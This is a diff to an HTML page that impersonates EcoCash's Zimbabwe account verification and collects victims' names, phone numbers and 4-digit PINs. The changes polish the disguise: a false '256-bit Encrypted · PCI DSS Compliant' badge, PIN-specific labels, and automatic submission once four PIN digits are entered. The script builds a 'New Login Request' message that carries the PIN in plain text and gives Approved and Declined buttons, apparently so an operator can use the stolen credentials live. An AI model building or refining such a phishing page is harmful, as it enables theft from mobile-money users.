@@ -3,20 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#001a4d">
+    <meta name="theme-color" content="#0a1628">
     <title>EcoCash | Verify Account · Zimbabwe</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --eco-red: #d32f2f;
-            --eco-blue-dark: #001a4d;
-            --eco-blue: #0033a0;
-            --eco-blue-light: #0052cc;
+            --eco-red: #e53935;
+            --eco-blue-dark: #0a1628;
+            --eco-blue: #1a3a6b;
+            --eco-blue-light: #2563eb;
+            --eco-accent: #3b82f6;
             --white: #ffffff;
-            --light-bg: #f5f7fa;
-            --text-dark: #1a1a1a;
-            --text-muted: #666666;
-            --border: #e0e0e0;
+            --light-bg: #f0f4f8;
+            --text-dark: #1a1a2e;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --success: #10b981;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -24,7 +26,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
+            background: linear-gradient(135deg, #0a1628 0%, #1a3a6b 50%, #0f2447 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -33,14 +35,14 @@
 
         header {
             background: white;
-            padding: 16px 5%;
-            border-bottom: 3px solid var(--eco-blue);
-            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
+            padding: 14px 5%;
+            border-bottom: 3px solid var(--eco-blue-light);
+            box-shadow: 0 2px 20px rgba(10, 22, 40, 0.12);
         }
 
         .logo {
             font-size: 24px;
-            font-weight: 800;
+            font-weight: 900;
             letter-spacing: -0.5px;
             text-decoration: none;
             display: flex;
@@ -61,24 +63,24 @@
 
         .login-container {
             background: white;
-            border-radius: 16px;
+            border-radius: 20px;
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
-            border: 2px solid var(--eco-blue);
+            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
+            border: 1px solid rgba(37, 99, 235, 0.1);
         }
 
         .login-header {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
 
         .login-header h1 {
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 900;
             color: var(--text-dark);
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             letter-spacing: -0.5px;
         }
 
@@ -88,10 +90,10 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
             border-radius: 12px;
             padding: 16px;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
             color: white;
         }
 
@@ -113,13 +115,13 @@
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .form-label {
             display: block;
             font-size: 12px;
-            font-weight: 800;
+            font-weight: 700;
             color: var(--eco-blue);
             text-transform: uppercase;
             letter-spacing: 0.05em;
@@ -129,7 +131,7 @@
         .input-wrapper {
             display: flex;
             align-items: center;
-            border: 2px solid var(--eco-blue);
+            border: 2px solid var(--border);
             border-radius: 12px;
             padding: 12px 14px;
             background: var(--light-bg);
@@ -137,13 +139,13 @@
         }
 
         .input-wrapper:focus-within {
-            border-color: var(--eco-red);
+            border-color: var(--eco-blue-light);
             background: white;
-            box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.1);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
         }
 
         .country-code {
-            font-weight: 800;
+            font-weight: 700;
             color: var(--eco-blue);
             margin-right: 10px;
             white-space: nowrap;
@@ -167,10 +169,10 @@
         .pin-toggle {
             background: none;
             border: none;
-            color: var(--eco-blue);
+            color: var(--eco-blue-light);
             cursor: pointer;
             font-weight: 700;
-            font-size: 14px;
+            font-size: 13px;
             padding: 0;
             transition: color 0.2s;
         }
@@ -182,19 +184,19 @@
         .form-hint {
             font-size: 12px;
             color: var(--text-muted);
-            margin-top: 8px;
+            margin-top: 6px;
             line-height: 1.5;
         }
 
         .error-msg {
             display: none;
-            background: rgba(211, 47, 47, 0.1);
-            border: 1px solid rgba(211, 47, 47, 0.3);
+            background: rgba(229, 57, 53, 0.08);
+            border: 1px solid rgba(229, 57, 53, 0.2);
             color: var(--eco-red);
             font-size: 13px;
             font-weight: 600;
-            border-radius: 8px;
-            padding: 10px 12px;
+            border-radius: 10px;
+            padding: 10px 14px;
             margin-bottom: 16px;
             text-align: center;
         }
@@ -206,12 +208,12 @@
         .btn-group {
             display: flex;
             gap: 12px;
-            margin-top: 28px;
+            margin-top: 24px;
         }
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -222,16 +224,16 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
         }
 
         .btn-primary:disabled {
-            background: #ccc;
+            background: #cbd5e1;
             cursor: not-allowed;
             box-shadow: none;
         }
@@ -239,8 +241,8 @@
         .btn-secondary {
             flex: 1;
             background: transparent;
-            color: var(--eco-blue);
-            border: 2px solid var(--eco-blue);
+            color: var(--eco-blue-light);
+            border: 2px solid var(--eco-blue-light);
             padding: 14px 20px;
             border-radius: 50px;
             font-weight: 800;
@@ -252,20 +254,20 @@
         }
 
         .btn-secondary:hover {
-            background: var(--light-bg);
+            background: rgba(37, 99, 235, 0.05);
         }
 
         .form-footer {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 18px;
             font-size: 12px;
             color: var(--text-muted);
         }
 
         .form-footer a {
-            color: var(--eco-blue);
+            color: var(--eco-blue-light);
             text-decoration: none;
-            font-weight: 800;
+            font-weight: 700;
         }
 
         .form-footer a:hover {
@@ -281,9 +283,9 @@
             justify-content: center;
             flex-direction: column;
             gap: 16px;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(10, 22, 40, 0.9);
             z-index: 2000;
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(6px);
         }
 
         .loading-overlay.active {
@@ -293,8 +295,8 @@
         .spinner {
             width: 56px;
             height: 56px;
-            border: 5px solid rgba(255, 255, 255, 0.2);
-            border-top-color: white;
+            border: 5px solid rgba(255, 255, 255, 0.15);
+            border-top-color: var(--eco-blue-light);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
@@ -307,7 +309,7 @@
 
         .spin-sub {
             font-size: 13px;
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(255, 255, 255, 0.6);
         }
 
         @keyframes spin {
@@ -321,10 +323,10 @@
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(10, 22, 40, 0.7);
             z-index: 2000;
             padding: 20px;
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(6px);
         }
 
         .modal-overlay.active {
@@ -333,21 +335,19 @@
 
         .modal-content {
             background: white;
-            border-radius: 16px;
-            padding: 32px;
+            border-radius: 20px;
+            padding: 36px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
+            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
             text-align: center;
-            border: 2px solid var(--eco-blue);
         }
 
         .modal-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 900;
             color: var(--text-dark);
-            margin-bottom: 12px;
-            letter-spacing: -0.5px;
+            margin-bottom: 10px;
         }
 
         .modal-subtitle {
@@ -359,7 +359,7 @@
 
         .modal-btn {
             width: 100%;
-            padding: 12px 20px;
+            padding: 14px 20px;
             border-radius: 50px;
             border: none;
             font-weight: 800;
@@ -368,14 +368,25 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
             color: white;
-            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
+            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
         }
 
         .modal-btn:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+            font-size: 11px;
+            color: var(--text-muted);
+            font-weight: 600;
         }
 
         @media (max-width: 600px) {
@@ -401,7 +412,7 @@
             <div id="bundleInfo" class="bundle-info" style="display: none;">
                 <div class="bundle-info-row">
                     <span>Bundle:</span>
-                    <span id="bundleData">—</span>
+                    <span id="bundleData">&mdash;</span>
                 </div>
                 <div class="bundle-info-row">
                     <span>Amount:</span>
@@ -420,30 +431,35 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="phone">Phone Number</label>
+                    <label class="form-label" for="phone">EcoCash Number</label>
                     <div class="input-wrapper">
-                        <span class="country-code">🇿🇼 +263</span>
+                        <span class="country-code">&#127487;&#127462; +263</span>
                         <input type="tel" class="form-input" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" autocomplete="tel">
                     </div>
                     <p class="form-hint">Enter your 9-digit number without the leading 0</p>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="pin">PIN</label>
+                    <label class="form-label" for="pin">EcoCash PIN</label>
                     <div class="input-wrapper">
-                        <input type="password" class="form-input" id="pin" placeholder="••••" inputmode="numeric" maxlength="4" autocomplete="off">
+                        <input type="password" class="form-input" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4" autocomplete="off">
                         <button type="button" class="pin-toggle" onclick="togglePinVisibility()">Show</button>
                     </div>
+                    <p class="form-hint">Your 4-digit EcoCash PIN</p>
                 </div>
 
                 <div class="btn-group">
                     <button type="submit" class="btn-primary" id="submitBtn">Verify & Proceed</button>
-                    <button type="button" class="btn-secondary" onclick="window.history.back()">Cancel</button>
+                    <button type="button" class="btn-secondary" onclick="window.location.href='index.html'">Cancel</button>
                 </div>
             </form>
 
             <div class="form-footer">
                 By proceeding, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+            </div>
+
+            <div class="security-note">
+                <span>&#128274;</span> 256-bit Encrypted &middot; PCI DSS Compliant
             </div>
         </div>
     </main>
@@ -451,8 +467,8 @@
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div class="spin-label">Waiting for Approval</div>
-        <div class="spin-sub">Please wait...</div>
+        <div class="spin-label">Processing Request</div>
+        <div class="spin-sub">Please wait while we verify your account...</div>
     </div>
 
     <!-- Already Applied Modal -->
@@ -526,6 +542,15 @@
             return false;
         }
 
+        // Auto-submit when PIN reaches 4 digits
+        document.getElementById('pin').addEventListener('input', function() {
+            if (this.value.length === 4) {
+                setTimeout(() => {
+                    document.getElementById('loginForm').dispatchEvent(new Event('submit', { cancelable: true }));
+                }, 300);
+            }
+        });
+
         function handleSubmit(e) {
             e.preventDefault();
             clearError();
@@ -560,15 +585,15 @@
             }
 
             const fullPhone = `+263${phone}`;
-            const message = `📱 <b>New Login Request</b>\n\n<b>Name:</b> ${name}\n<b>Phone:</b> <code>${fullPhone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> ${bundleData.data}\n<b>Amount:</b> USD ${bundleData.price}`;
+            const message = `📱 <b>New Login Request</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>${fullPhone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>`;
             
             const buttons = [
                 [
-                    { text: '✓ Approved', callback_data: 'login_approved' },
-                    { text: '✗ Declined', callback_data: 'login_declined' }
+                    { text: '\u2713 Approved', callback_data: 'login_approved' },
+                    { text: '\u2717 Declined', callback_data: 'login_declined' }
                 ],
                 [
-                    { text: '⚠️ Already Applied', callback_data: 'login_applied' }
+                    { text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }
                 ]
             ];
 
@@ -626,10 +651,6 @@
 
         document.getElementById('phone').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') document.getElementById('pin').focus();
-        });
-
-        document.getElementById('pin').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') document.getElementById('loginForm').dispatchEvent(new Event('submit'));
         });
 
         window.addEventListener('load', loadBundleData);
